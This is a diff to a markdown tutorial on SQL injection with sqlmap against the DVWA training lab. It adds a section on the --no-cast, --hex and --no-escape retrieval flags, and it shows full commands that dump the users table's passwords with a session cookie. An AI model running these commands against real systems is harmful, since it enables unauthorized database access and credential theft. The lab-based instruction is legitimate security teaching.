@@ -2,13 +2,6 @@
 
 Search Tag(s): #sql-injection #sqlmap #credential-access-and-dumping #data-exfiltration #dvwa
 
-TODO: Cover these parts
-
-```
---no-cast           Turn off payload casting mechanism (prevents problems for data retrieval)
---no-escape         Turn off string escaping mechanism (part of obfuscation and prevents problems for data retrieval)
---hex               Use hex conversion during data retrieval (prevents problems for data retrieval)
-```
 ### 3.1 - Dump the whole database
 
 ```
@@ -27,7 +20,27 @@ $ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -
 $ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --passwords
 ```
 
-### 3.4 - Data Exfiltration via DNS (Out-of-band SQL Injection)
+### 3.4 - Data retrieval mechanisms
+
+The `--no-cast` flag will replace the `NULL` values with whitespace character. Some older versions of MySQL contains `None` values which is why the mechanism needed to be turned off.
+
+```
+$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --no-cast -D dvwa -T users -C user,password --dump
+```
+
+The `--hex` will convert the retrieved data into a encoded hexadecimal form then it will be decoded during data retrieval.
+
+```
+$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --hex -D dvwa -T users -C user,password --dump
+```
+
+There are cases of during data retrieval that some security defenses have a set of rules such as, `magic_quotes` and/or `mysql_real_escape_string` at the back-end server. Using the `--no-esacpe` switch to obfuscate the string values inside payloads (e.g `SELECT 'user'`) will be converted into decimal values (e.g `SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)`).
+
+```
+$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --no-escape -D dvwa -T users -C user,password --dump
+```
+
+### 3.5 - Data exfiltration via DNS (Out-of-band SQL Injection)
 
 TODO: Demonstrate DNS exfiltration via sqlmap
 
